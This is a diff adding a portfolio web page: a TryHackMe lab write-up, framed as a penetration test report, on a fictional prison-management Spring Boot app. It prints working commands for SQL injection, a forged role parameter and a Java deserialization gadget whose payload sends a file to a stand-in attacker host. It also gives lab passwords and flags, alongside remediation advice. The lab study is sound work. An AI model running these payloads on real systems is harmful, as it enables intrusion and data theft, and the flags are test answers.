@@ -1,0 +1,348 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="description" content="Ironhold’s inmate-management platform was assessed using the publicly leaked unredacted source repository and the live lab instance. Seven confirmed issues were">
+    <meta name="author" content="dotne1">
+    <meta property="og:title" content="Ironhold — Penetration Test Disclosure Report - dotne1 Write-Ups">
+    <meta property="og:type" content="website">
+    <title>Ironhold — Penetration Test Disclosure Report - dotne1 Write-Ups</title>
+    <link rel="stylesheet" href="../styles.css">
+    <link rel="stylesheet" href="writeups.css">
+    <link rel="icon" type="image/x-icon" href="../favicon.ico">
+</head>
+<body>
+    <nav class="navbar">
+        <div class="nav-links">
+            <a href="../index.html" class="nav-link">Home</a>
+            <a href="../about-me.html" class="nav-link">About Me</a>
+            <a href="../projects.html" class="nav-link">Projects</a>
+            <a href="../writeups.html" class="nav-link">Write-Ups</a>
+            <a href="../resume.html" class="nav-link">Resume</a>
+            <a href="../feeds.html" class="nav-link">Feeds</a>
+        </div>
+    </nav>
+
+    <div class="container" role="main">
+<p class="back-link"><a href="../writeups.html">&larr; Back to Write-Ups</a></p>
+<h1 class="main-header">Ironhold — Penetration Test Disclosure Report</h1>
+<p class="writeup-meta"><span class="tag">TryHackMe</span> <span class="tag diff diff-hard">Hard</span> <span class="dot">·</span> <span class="date">2026-07-18</span></p>
+<div class="writeup-content">
+<p><strong>Target:</strong> 10.67.135.77   <strong>Assessment Date:</strong> 2026-07-18   <strong>Mode:</strong> pt1   <strong>Classification:</strong> CONFIDENTIAL   <strong>Application:</strong> Ironhold Correctional facility management (Spring Boot 2.7.18 / Java 11)   <strong>Web:</strong> http://10.67.135.77:8080  </p>
+<hr>
+<h2>1. Executive Summary</h2>
+<p>Ironhold’s inmate-management platform was assessed using the publicly leaked unredacted source repository and the live lab instance. Seven confirmed issues were identified, including two Critical findings (privilege escalation via mass assignment and remote code execution via insecure Java deserialization). With no prior credentials, an attacker can authenticate using seeded officer passwords from source, read restricted Internal Affairs data via SQL injection, elevate to Warden through an unrestricted profile field, and achieve OS command execution as <code>appuser</code> on the facility host—reading the host-level flag under <code>/opt/ironhold/</code>. Maximum access achieved: authenticated application compromise (Warden role) plus remote code execution on the application container/host as the service account.</p>
+<hr>
+<h2>2. Scope</h2>
+<table>
+<thead><tr>
+<th>Element</th>
+<th>Detail</th>
+</tr></thead><tbody>
+<tr>
+<td>Target</td>
+<td>10.67.135.77</td>
+</tr>
+<tr>
+<td>Ports in scope</td>
+<td>22/tcp (OpenSSH 9.6p1), 8080/tcp (Spring Boot / embedded Tomcat)</td>
+</tr>
+<tr>
+<td>Applications</td>
+<td>Ironhold Facility Management (leaked source + live copy)</td>
+</tr>
+<tr>
+<td>Assessment type</td>
+<td>External / source-assisted web application penetration test (lab)</td>
+</tr>
+<tr>
+<td>Environment</td>
+<td>Linux (Ubuntu-class); app runs as <code>appuser</code>; H2 in-memory DB</td>
+</tr>
+<tr>
+<td>Explicit artifacts</td>
+<td>Full source zip supplied with engagement; VPN via tun0</td>
+</tr>
+</tbody></table>
+<p><strong>Out of scope:</strong> Production systems outside the assigned lab host; denial-of-service load testing; brute-force beyond rate-limited targeted auth.</p>
+<hr>
+<h2>3. Attack Chain</h2>
+<pre><code>Leaked source (DataSeeder)
+  → Login as j.reyes / IronholdStaff2026!          [F-01]
+  → Officer dashboard notices → Flag 1
+  → SQLi on /inmates/search UNION case_files       [F-02] → Flag 2
+  → POST /profile/update role=WARDEN               [F-03]
+  → /admin/control door panel → Flag 3
+  → POST /admin/import ObjectInputStream gadget    [F-04]
+  → RCE as appuser; cat /opt/ironhold/flag.txt → Flag 4
+Parallel: unauth /actuator/env → kiosk password    [F-05]</code></pre>
+<hr>
+<h2>4. Findings Summary</h2>
+<table>
+<thead><tr>
+<th>ID</th>
+<th>Finding</th>
+<th>CVSSv3</th>
+<th>Risk</th>
+</tr></thead><tbody>
+<tr>
+<td>F-04</td>
+<td>Insecure Java deserialization → RCE</td>
+<td>9.9</td>
+<td>Critical</td>
+</tr>
+<tr>
+<td>F-03</td>
+<td>Mass assignment elevates role to WARDEN</td>
+<td>8.8</td>
+<td>Critical</td>
+</tr>
+<tr>
+<td>F-01</td>
+<td>Seeded/hardcoded staff credentials in source</td>
+<td>8.6</td>
+<td>High</td>
+</tr>
+<tr>
+<td>F-02</td>
+<td>SQL injection (UNION) on inmate search</td>
+<td>7.5</td>
+<td>High</td>
+</tr>
+<tr>
+<td>F-05</td>
+<td>Unauthenticated Actuator env disclosure</td>
+<td>7.5</td>
+<td>High</td>
+</tr>
+<tr>
+<td>F-06</td>
+<td>Session/ACL model trusts mutable role field</td>
+<td>6.5</td>
+<td>Medium</td>
+</tr>
+<tr>
+<td>F-07</td>
+<td>Shared passwords / weak credential hygiene</td>
+<td>5.3</td>
+<td>Medium</td>
+</tr>
+</tbody></table>
+<hr>
+<h2>5. Detailed Findings</h2>
+<h3>F-04: Insecure Java deserialization on bulk import (RCE)</h3>
+<p><strong>Severity:</strong> Critical (CVSSv3: 9.9)   <strong>Affected Component:</strong> <code>POST /admin/import</code> (<code>ImportExportController</code>); dependency <code>commons-collections</code> 3.2.x  </p>
+<p><strong>Description:</strong>   The bulk import endpoint accepts a Base64 body, decodes it, and immediately deserializes the bytes with <code>ObjectInputStream.readObject()</code> without type filtering or allowlisting. The project intentionally (or carelessly) includes a vulnerable Commons Collections 3.x range suitable for gadget chains. Combined with Warden access (or F-03), this yields remote code execution as the application user.</p>
+<p><strong>Steps to Reproduce:</strong></p>
+<pre><code># After obtaining a Warden session (see F-03):
+# Generate CommonsCollections7 gadget (Java 11: use --add-opens if needed for other gadgets)
+CMD=&#x27;curl -G http://ATTACKER:8000/cat --data-urlencode d@/opt/ironhold/flag.txt&#x27;
+B64=$(printf &#x27;%s&#x27; &quot;$CMD&quot; | base64 -w0)
+java -jar ysoserial.jar CommonsCollections7 &quot;bash -c {echo,${B64}}|{base64,-d}|bash&quot; \
+  | base64 -w0 &gt; /tmp/payload.b64
+curl -b cookies.txt -X POST http://10.67.135.77:8080/admin/import \
+  -H &#x27;Content-Type: text/plain&#x27; --data-binary @/tmp/payload.b64
+# Observe callback with file contents (HTTP 500 on import is expected)</code></pre>
+<p><strong>Impact:</strong> Full command execution on the facility host as <code>appuser</code>; read of host secrets including <code>/opt/ironhold/flag.txt</code>; potential pivot to further host compromise.</p>
+<p><strong>CVSS Justification:</strong> AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H — network RCE with low complexity once low-privilege app user is obtained; scope changed (host beyond pure app data).</p>
+<p><strong>Evidence:</strong> <code>screenshots/F-04_deser_rce.txt</code>, <code>screenshots/F-04_http_exfil_log.txt</code>, <code>screenshots/flag_4.txt</code>, <code>exploits/deser_import.sh</code></p>
+<hr>
+<h3>F-03: Mass assignment — arbitrary role elevation to WARDEN</h3>
+<p><strong>Severity:</strong> Critical (CVSSv3: 8.8)   <strong>Affected Component:</strong> <code>POST /profile/update</code> (<code>ProfileController</code>)  </p>
+<p><strong>Description:</strong>   Profile updates bind a <code>Staff</code> model attribute and apply <code>role</code> from the client if non-blank. The HTML form does not expose a role control, but the server honors a forged parameter. <code>WardenInterceptor</code> only checks <code>staff.isWarden()</code> against the database role, so elevation grants the entire <code>/admin/**</code> surface including door control and import.</p>
+<p><strong>Steps to Reproduce:</strong></p>
+<pre><code>curl -c c.txt -b c.txt -X POST http://10.67.135.77:8080/login \
+  -d &#x27;username=j.reyes&amp;password=IronholdStaff2026!&#x27;
+curl -b c.txt -X POST http://10.67.135.77:8080/profile/update \
+  -d &#x27;fullName=Officer+J.+Reyes&amp;email=j.reyes@ironhold.example&amp;badgeNumber=O-104&amp;role=WARDEN&#x27;
+curl -b c.txt http://10.67.135.77:8080/admin/control
+# Displays Facility Master Override Code / Flag 3</code></pre>
+<p><strong>Impact:</strong> Vertical privilege escalation from officer to warden; access to door-control panel, staff administration, diagnostics, and RCE-prone import.</p>
+<p><strong>CVSS Justification:</strong> AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H — authenticated low-privilege user, high CIA impact on application.</p>
+<p><strong>Evidence:</strong> <code>screenshots/flag3_warden_door_control.html</code>, <code>screenshots/flag_3.txt</code></p>
+<hr>
+<h3>F-01: Seeded / hardcoded staff credentials in leaked source</h3>
+<p><strong>Severity:</strong> High (CVSSv3: 8.6)   <strong>Affected Component:</strong> <code>DataSeeder.java</code>; <code>POST /login</code>  </p>
+<p><strong>Description:</strong>   The leaked repository hardcodes the password used for all non-kiosk, non-warden staff: <code>IronholdStaff2026!</code>. Usernames <code>j.reyes</code>, <code>m.chen</code>, <code>a.osei</code>, and <code>l.bianchi</code> authenticate successfully. The officer dashboard renders facility notices containing Flag 1.</p>
+<p><strong>Steps to Reproduce:</strong></p>
+<pre><code>curl -c c.txt -b c.txt -X POST http://10.67.135.77:8080/login \
+  -d &#x27;username=j.reyes&amp;password=IronholdStaff2026!&#x27;
+curl -b c.txt http://10.67.135.77:8080/dashboard | grep -oE &#x27;THM\{[^}]+\}&#x27;
+# THM{k10sk_c0nsol3_unl0ck3d}</code></pre>
+<p><strong>Impact:</strong> Immediate authenticated access for any party holding the repository; bypasses need for credential guessing.</p>
+<p><strong>CVSS Justification:</strong> AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:L/A:L — public knowledge of password from source leak; high confidentiality impact on app data.</p>
+<p><strong>Evidence:</strong> <code>loot/creds.txt</code>, <code>screenshots/flag1_officer_dashboard.html</code>, <code>screenshots/flag_1.txt</code></p>
+<hr>
+<h3>F-02: SQL injection in inmate search (UNION → case_files)</h3>
+<p><strong>Severity:</strong> High (CVSSv3: 7.5)   <strong>Affected Component:</strong> <code>GET /inmates/search?q=</code> (<code>InmateController</code>)  </p>
+<p><strong>Description:</strong>   The search builds SQL via string concatenation:   <code>SELECT id, name, block FROM inmates WHERE name = &#x27;&quot; + q + &quot;&#x27;&quot;</code>.   A reduced-privilege H2 user (<code>ironhold_lookup</code>) can SELECT only <code>inmates</code> and <code>case_files</code>. UNION against <code>case_files</code> returns Internal Affairs case summary text (Flag 2) that no template intentionally displays.</p>
+<p><strong>Steps to Reproduce:</strong></p>
+<pre><code># authenticated session required
+curl -b c.txt -G &#x27;http://10.67.135.77:8080/inmates/search&#x27; \
+  --data-urlencode &quot;q=x&#x27; UNION SELECT id, summary, status FROM case_files--&quot;
+# Row shows THM{c4s3_f1l3_pull3d_via_uni0n}</code></pre>
+<p><strong>Impact:</strong> Disclosure of sensitive case-file content and any other data readable by the lookup principal.</p>
+<p><strong>CVSS Justification:</strong> AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N — authenticated SQLi with high confidentiality impact; write not demonstrated under least-privilege account.</p>
+<p><strong>Evidence:</strong> <code>screenshots/F-02_sqli_case_files.html</code>, <code>screenshots/flag_2.txt</code></p>
+<hr>
+<h3>F-05: Unauthenticated Spring Boot Actuator exposure</h3>
+<p><strong>Severity:</strong> High (CVSSv3: 7.5)   <strong>Affected Component:</strong> <code>/actuator/**</code> (excluded from auth interceptor); <code>management.endpoints.web.exposure.include=*</code>  </p>
+<p><strong>Description:</strong>   Actuator discovery, health, env, configprops, mappings, and related endpoints are reachable without authentication. Querying <code>/actuator/env/app.kiosk.pw</code> returned the kiosk password in cleartext (<code>Sh1ftK10sk#2091</code>).</p>
+<p><strong>Steps to Reproduce:</strong></p>
+<pre><code>curl -s http://10.67.135.77:8080/actuator | head
+curl -s http://10.67.135.77:8080/actuator/env/app.kiosk.pw
+# value: Sh1ftK10sk#2091</code></pre>
+<p><strong>Impact:</strong> Credential and configuration disclosure without any login; accelerates initial access and mapping of the app.</p>
+<p><strong>CVSS Justification:</strong> AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N — unauthenticated high confidentiality disclosure.</p>
+<p><strong>Evidence:</strong> <code>screenshots/F-05_actuator_kiosk_pw.json</code></p>
+<hr>
+<h3>F-06: Authorization model trusts mutable database role</h3>
+<p><strong>Severity:</strong> Medium (CVSSv3: 6.5)   <strong>Affected Component:</strong> <code>WardenInterceptor</code> + <code>SessionUtil</code> (username-only session)  </p>
+<p><strong>Description:</strong>   Sessions store only the username. Privileged path checks re-load <code>Staff.role</code> from the database. There is no server-side separation preventing self-service mutation of that field (see F-03), and no CSRF protection on profile or import POSTs.</p>
+<p><strong>Steps to Reproduce:</strong> See F-03; observe role change on <code>/profile</code> after forged POST.</p>
+<p><strong>Impact:</strong> Weak foundation for access control; any mass-assignment or SQLi write would also elevate privileges.</p>
+<p><strong>CVSS Justification:</strong> AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N — design weakness enabling high confidentiality impact when combined with F-03.</p>
+<p><strong>Evidence:</strong> <code>source/src/main/java/com/ironhold/controller/ProfileController.java</code>, <code>security/WardenInterceptor.java</code></p>
+<hr>
+<h3>F-07: Shared officer and kiosk credentials</h3>
+<p><strong>Severity:</strong> Medium (CVSSv3: 5.3)   <strong>Affected Component:</strong> Seed data; operational notices  </p>
+<p><strong>Description:</strong>   All floor officers share one password; the kiosk is a shared shift account documented in facility notices. This violates least privilege and credential uniqueness.</p>
+<p><strong>Steps to Reproduce:</strong> Authenticate multiple officer accounts with <code>IronholdStaff2026!</code> (see F-01).</p>
+<p><strong>Impact:</strong> Single compromise or leak unlocks many identities; weak non-repudiation.</p>
+<p><strong>CVSS Justification:</strong> AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N — contributes to confidentiality exposure of operational accounts.</p>
+<p><strong>Evidence:</strong> <code>loot/creds.txt</code>, <code>source/.../DataSeeder.java</code></p>
+<hr>
+<h2>6. Remediation (mapped to F-IDs)</h2>
+<table>
+<thead><tr>
+<th>ID</th>
+<th>Recommendation</th>
+</tr></thead><tbody>
+<tr>
+<td>F-04</td>
+<td>Remove Java serialization from network boundaries. Prefer JSON schemas. If migration is required short-term, use a strict allowlist <code>ObjectInputFilter</code> and eliminate Commons Collections 3.x gadgets.</td>
+</tr>
+<tr>
+<td>F-03</td>
+<td>Never bind <code>role</code> (or other privilege fields) from client input. Use a dedicated DTO with only fullName/email/badge. Enforce role changes only via privileged admin API with audit logging.</td>
+</tr>
+<tr>
+<td>F-01</td>
+<td>Rotate all credentials after any source leak. Do not ship production passwords in seed code; use secrets managers and unique per-user passwords.</td>
+</tr>
+<tr>
+<td>F-02</td>
+<td>Use parameterized queries (<code>?</code> placeholders / JPA criteria). Keep least-privilege DB users; ensure sensitive tables are not granted even for “read-only lookup.”</td>
+</tr>
+<tr>
+<td>F-05</td>
+<td>Authenticate and network-restrict actuator. Set <code>management.endpoints.web.exposure.include=health</code> (or empty). Never expose <code>env</code> publicly. Remove <code>/actuator/**</code> from auth exclusions except health if required.</td>
+</tr>
+<tr>
+<td>F-06</td>
+<td>Store role claims in signed session tokens at login, or re-validate immutably; add CSRF tokens on state-changing forms.</td>
+</tr>
+<tr>
+<td>F-07</td>
+<td>Unique passwords per staff; disable shared kiosk or use short-lived device auth.</td>
+</tr>
+</tbody></table>
+<hr>
+<h2>7. Proof of Impact / Objectives</h2>
+<table>
+<thead><tr>
+<th>Objective</th>
+<th>Result</th>
+</tr></thead><tbody>
+<tr>
+<td>Flag on officer dashboard</td>
+<td><code>THM{k10sk_c0nsol3_unl0ck3d}</code></td>
+</tr>
+<tr>
+<td>Flag in staff/case record not shown on site pages</td>
+<td><code>THM{c4s3_f1l3_pull3d_via_uni0n}</code></td>
+</tr>
+<tr>
+<td>Flag on warden door-control panel</td>
+<td><code>THM{w4rd3n_b4dg3_f0rg3d}</code></td>
+</tr>
+<tr>
+<td>Flag on facility server after gate</td>
+<td><code>THM{0v3r_th3_w4ll_4nd_g0n3}</code></td>
+</tr>
+<tr>
+<td>Max access</td>
+<td>Warden app role + RCE as <code>appuser</code></td>
+</tr>
+</tbody></table>
+<p>Evidence copies: <code>loot/flags.txt</code>, <code>screenshots/flag_*.txt</code>.</p>
+<hr>
+<h2>8. Cleanup / Residual Risk</h2>
+<table>
+<thead><tr>
+<th>Item</th>
+<th>Status</th>
+</tr></thead><tbody>
+<tr>
+<td>Application role for <code>j.reyes</code> set to WARDEN during test</td>
+<td><strong>Residual</strong> — lab may reset on reboot; if persistent, restore role to OFFICER via admin or DB reset</td>
+</tr>
+<tr>
+<td>Reverse shells / webshells on target</td>
+<td>None planted</td>
+</tr>
+<tr>
+<td>Attacker HTTP listeners (port 8000)</td>
+<td>Stopped</td>
+</tr>
+<tr>
+<td>Deserialization payloads</td>
+<td>Ephemeral; no files written on target intentionally</td>
+</tr>
+<tr>
+<td>H2 in-memory DB</td>
+<td>Resets on application restart</td>
+</tr>
+</tbody></table>
+<p>No long-lived implants were left. The only durable mutation attempted was elevating <code>j.reyes</code> role in the in-memory staff table (cleared when the app restarts).</p>
+<hr>
+<h2>9. Limitations / Assumptions</h2>
+<ul>
+<li>Source was treated as accurate for the live build; confirmed by exploitation.</li>
+<li>H2 in-memory database implies seed data and mutations are process-lifetime only.</li>
+<li>Root/host privilege escalation beyond <code>appuser</code> was not pursued after flag capture; container boundaries may limit further access.</li>
+<li>Warden env password was not cracked; F-03 made it unnecessary.</li>
+<li>Assessment used rate-limited authentication and did not spray accounts.</li>
+</ul>
+<hr>
+<h2>10. Port / Coverage Notes</h2>
+<table>
+<thead><tr>
+<th>Port</th>
+<th>Service</th>
+<th>Enum</th>
+<th>Result</th>
+</tr></thead><tbody>
+<tr>
+<td>22/tcp</td>
+<td>OpenSSH 9.6p1</td>
+<td>Banner only</td>
+<td>No credentials used for SSH; RCE path did not require SSH</td>
+</tr>
+<tr>
+<td>8080/tcp</td>
+<td>Ironhold Spring Boot</td>
+<td>Full source-assisted testing</td>
+<td>Compromise chain F-01→F-04</td>
+</tr>
+</tbody></table>
+<p>Holistic web checklist: auth (seeded creds, actuator), session (HttpOnly JSESSIONID; no Secure/SameSite noted), ACL (mass assignment), injection (SQLi + deser), misconfig (actuator exposure), business logic (role self-elevation).</p>
+</div>
+    </div>
+
+    <footer class="footer">
+        <p>&copy; 2026 dotne1 - Cybersecurity Portfolio</p>
+    </footer>
+</body>
+</html>
